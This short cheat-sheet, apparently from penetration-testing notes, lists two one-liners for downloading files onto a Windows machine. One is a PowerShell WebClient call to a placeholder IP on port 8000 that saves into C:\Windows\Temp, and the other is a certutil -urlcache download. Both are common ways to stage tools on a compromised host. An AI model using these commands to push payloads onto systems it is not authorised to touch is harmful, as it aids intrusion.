# Transferring files

Download files using Powershell one liner

```powershell
powershell -Command "(new-object System.Net.WebClient).DownloadFile('http://<ip address>:8000/w<file name>', 'C:\Windows\Temp\<filename>')"
```

Download using certutil

```bash
certutil -urlcache -f <url>/<filename>
```

